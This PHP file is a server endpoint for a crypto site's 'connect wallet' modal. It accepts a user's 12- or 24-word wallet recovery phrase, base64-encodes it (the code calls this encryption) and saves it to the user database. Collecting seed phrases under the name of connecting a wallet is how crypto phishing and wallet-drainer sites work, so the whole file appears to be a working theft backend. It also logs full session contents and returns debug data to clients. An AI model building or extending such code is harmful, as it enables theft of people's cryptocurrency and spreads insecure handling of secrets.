<?php
/**
 * WALLET_HANDLER.PHP
 * Handles wallet connection requests from the connect wallet modal
 * Saves wallet recovery phrases to the database for specific user
 */

header('Content-Type: application/json');

// Start session before includes
if (session_status() === PHP_SESSION_NONE) {
    date_default_timezone_set("Europe/London");
    ini_set('session.gc_maxlifetime', 3600);
    session_set_cookie_params(3600);
    session_start();
}

// Prevent redirect by temporarily disabling dashboard_init's auth check
define('WALLET_HANDLER_API', true);

// Include database config directly to avoid the redirect
if (!defined('DB_HOST')) {
    // From dashboard/api/ go up to root: dirname(dirname(dirname(__FILE__))) = zenbbit-v1
    $dbConfigPath = dirname(dirname(dirname(__FILE__))) . DIRECTORY_SEPARATOR . 'database' . DIRECTORY_SEPARATOR . 'db_config.php';
    if (!file_exists($dbConfigPath)) {
        die(json_encode(['success' => false, 'message' => 'Database config not found at: ' . $dbConfigPath]));
    }
    include $dbConfigPath;
}

try {
    // Check if request method is POST
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception('Invalid request method. POST required.');
    }

    // Debug: Log detailed session and POST info
    error_log('=== Wallet Handler Debug ===');
    error_log('Session ID: ' . session_id());
    error_log('Session Status: ' . session_status());
    error_log('All Session Keys: ' . implode(', ', array_keys($_SESSION)));
    error_log('Session Contents: ' . json_encode($_SESSION, JSON_PARTIAL_OUTPUT_ON_ERROR | JSON_UNESCAPED_SLASHES));
    error_log('Session user_id: ' . (isset($_SESSION['user_id']) ? $_SESSION['user_id'] : 'NOT SET'));
    error_log('Session wallet_token exists: ' . (isset($_SESSION['wallet_token']) ? 'YES' : 'NO'));
    error_log('POST wallet_token exists: ' . (isset($_POST['wallet_token']) ? 'YES' : 'NO'));
    error_log('All POST keys: ' . implode(', ', array_keys($_POST)));
    error_log('POST wallet_name: ' . ($_POST['wallet_name'] ?? 'NOT SET'));
    error_log('POST mnemonic length: ' . (isset($_POST['mnemonic']) ? strlen($_POST['mnemonic']) : 'NOT SET'));
    error_log('========================');

    // Check if user is authenticated
    $user_id = null;
    
    // Method 1: Try session authentication (primary)
    if (isset($_SESSION['user_id']) && !empty($_SESSION['user_id'])) {
        $user_id = $_SESSION['user_id'];
        error_log('User authenticated via session: ' . $user_id);
    }
    // Method 2: Try token-based authentication (fallback for Tracking Prevention)
    elseif (isset($_POST['wallet_token']) && isset($_SESSION['wallet_token'])) {
        if ($_POST['wallet_token'] === $_SESSION['wallet_token']) {
            // Token is valid, user must be logged in to have generated it
            if (isset($_SESSION['user_id'])) {
                $user_id = $_SESSION['user_id'];
                error_log('User authenticated via token: ' . $user_id);
            } else {
                throw new Exception('Valid token but user_id not found in session.');
            }
        } else {
            throw new Exception('Invalid wallet token.');
        }
    } else {
        error_log('No authentication method available');
        error_log('Session wallet_token exists: ' . (isset($_SESSION['wallet_token']) ? 'yes' : 'no'));
        error_log('POST wallet_token exists: ' . (isset($_POST['wallet_token']) ? 'yes' : 'no'));
        throw new Exception('User not authenticated. Please log in first.');
    }
    
    if (!$user_id) {
        throw new Exception('User authentication failed.');
    }

    // Get POST data - wallet_handler.php receives FormData from JavaScript
    $wallet_name = $_POST['wallet_name'] ?? null;
    $mnemonic = $_POST['mnemonic'] ?? null;

    // Validate required fields
    if (empty($wallet_name) || empty($mnemonic)) {
        throw new Exception('Wallet name and mnemonic are required.');
    }

    $wallet_name = trim($wallet_name);
    $mnemonic = trim($mnemonic);

    // Validate mnemonic format (12 or 24 words)
    $words = explode(' ', $mnemonic);
    $word_count = count(array_filter($words));
    
    if ($word_count !== 12 && $word_count !== 24) {
        throw new Exception('Mnemonic must contain 12 or 24 words.');
    }

    // Encrypt mnemonic for security (basic encryption - use proper encryption in production)
    $encrypted_mnemonic = base64_encode($mnemonic); // Use openssl_encrypt() in production

    // Ensure database connection exists
    if (!isset($conn) || !$conn) {
        throw new Exception('Database connection failed.');
    }

    $sql = "UPDATE user 
            SET connected_wallet_name = ?,
                wallet_phrase = ?,
                wallet_phrase_verified = 0,
                wallet_connected_at = NOW()
            WHERE id = ?";

    error_log('Executing SQL: ' . $sql);
    error_log('With values - wallet_name: ' . $wallet_name . ', user_id/id: ' . $user_id . ', mnemonic_length: ' . strlen($encrypted_mnemonic));

    $stmt = $conn->prepare($sql);
    
    if (!$stmt) {
        throw new Exception('Database error: ' . $conn->error);
    }
    
    $stmt->bind_param('ssi', $wallet_name, $encrypted_mnemonic, $user_id);
    
    if (!$stmt->execute()) {
        throw new Exception('Failed to update user record: ' . $stmt->error);
    }

    error_log('Affected rows: ' . $stmt->affected_rows);
    
    if ($stmt->affected_rows === 0) {
        error_log('UPDATE query affected 0 rows!');
        error_log('Attempting to verify if user exists...');
        
        // Debug: Check if user exists
        $check_sql = "SELECT id FROM user WHERE id = ? LIMIT 1";
        $check_stmt = $conn->prepare($check_sql);
        if ($check_stmt) {
            $check_stmt->bind_param('i', $user_id);
            $check_stmt->execute();
            $check_result = $check_stmt->get_result();
            if ($check_result->num_rows > 0) {
                error_log('User EXISTS in database with id: ' . $user_id);
                error_log('UPDATE failed for another reason - possible column issue');
            } else {
                error_log('User NOT FOUND in database with id: ' . $user_id);
            }
            $check_stmt->close();
        }
        
        throw new Exception('User not found or no update made.');
    }

    $stmt->close();

    // Return success response
    echo json_encode([
        'success' => true,
        'message' => 'Wallet phrase saved successfully. Your wallet is now connected.',
        'wallet_name' => $wallet_name,
        'word_count' => $word_count,
        'timestamp' => time()
    ]);
    exit;

} catch (Exception $e) {
    http_response_code(400);
    
    // Additional debugging
    $debug_info = [
        'session_id' => session_id(),
        'has_user_id' => isset($_SESSION['user_id']),
        'user_id' => isset($_SESSION['user_id']) ? $_SESSION['user_id'] : null,
        'has_wallet_token' => isset($_SESSION['wallet_token']),
        'post_keys' => array_keys($_POST),
        'error_message' => $e->getMessage(),
        'error_line' => $e->getLine()
    ];
    
    echo json_encode([
        'success' => false,
        'message' => $e->getMessage(),
        'error_code' => 'WALLET_ERROR',
        'debug' => $debug_info
    ]);
    exit;
}
?>

